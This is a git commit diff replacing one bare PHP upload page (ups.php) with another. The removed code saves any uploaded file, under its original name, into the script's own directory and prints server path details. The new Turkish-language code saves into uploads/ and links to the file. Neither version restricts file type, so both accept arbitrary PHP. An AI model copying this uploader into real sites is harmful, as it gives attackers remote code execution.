8a551c3f5fbb8fc3236e4dcbe83a66abd3d55e47
xkzyx <147046108+xkzyx@users.noreply.github.com>
2024-12-18 15:39:47 +0300

    Update ups.php

--- ups.php
+++ ups.php
@@ -1,29 +1,25 @@
-<?php if (isset($_FILES["userfile"]["name"]))  {
-    $uploaddir = getcwd() . "/";
-    $uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]);
-    echo "<p>";
-    if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile))  {
-        echo "Upload Successful\n";
-    } else {
-        echo "Failed To Upload";
-    }
-    echo "</p>";
-    echo "<pre>";
-    echo "Information :\n";
-    echo "Your Directory Is :";
-    echo getcwd() . "\n";
-    print_r($_FILES);
-    if ($_FILES["userfile"]["error"] == 0)  {
-        echo "<br><br><a href=\"{$_FILES["userfile"]["name"]}\" TARGET=_BLANK>{$_FILES["userfile"]["name"]}</a><br><br>";
-        echo getcwd() . "\n";
-    }
-    echo "</pre>";
-}
-echo "<form enctype=\"multipart/form-data\" action=\"{$_SERVER["PHP_SELF"]}\" method=\"POST\">";
-echo "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"512000\" />";
-echo "Select Your File : <input name=\"userfile\" type=\"file\" />";
-echo "<input type=\"submit\" value=\"Upload\" />";
-echo "</form>";
-exit;
-?>
+<?php
+$uploadDir = __DIR__ . '/uploads/';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+    $file = $_FILES['file'];
+    if ($file['error'] === UPLOAD_ERR_OK) {
+        $fileName = basename($file['name']);
+        $targetPath = $uploadDir . $fileName;
 
+        if (move_uploaded_file($file['tmp_name'], $targetPath)) {
+            echo "Dosya başarıyla yüklendi: <a href='uploads/$fileName' target='_blank'>$fileName</a>";
+        } else {
+            echo "Dosya yüklenirken bir hata oluştu.";
+        }
+    } else {
+        echo "Yükleme hatası: " . $file['error'];
+    }
+} else {
+    echo "Lütfen bir dosya seçin.";
+}
+?>
+<form method="POST" enctype="multipart/form-data">
+    <label for="file">Dosyanızı seçin:</label>
+    <input type="file" name="file" id="file" required>
+    <button type="submit">Yükle</button>
+</form>
